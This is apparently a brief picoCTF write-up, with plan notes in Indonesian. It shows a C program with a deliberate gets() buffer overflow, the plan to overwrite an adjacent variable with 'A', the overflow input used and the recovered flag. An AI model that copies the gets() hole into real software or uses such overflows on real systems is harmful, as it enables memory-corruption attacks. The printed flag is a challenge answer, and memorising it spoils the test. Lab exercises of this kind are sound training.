# Local-target
## Problem
```
#include <stdio.h>
#include <stdlib.h>



int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}

```
## Rencana
* Ambil offset menggunakan gdb
* buat string dengan karakter sebanyak offset lalu tambah karakter 'A' di akhirnya (65)

## Hasil
```
Enter a string: Aa0Bb1Cc2Dd3Ee4Ff5Gg6Hh7A

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
```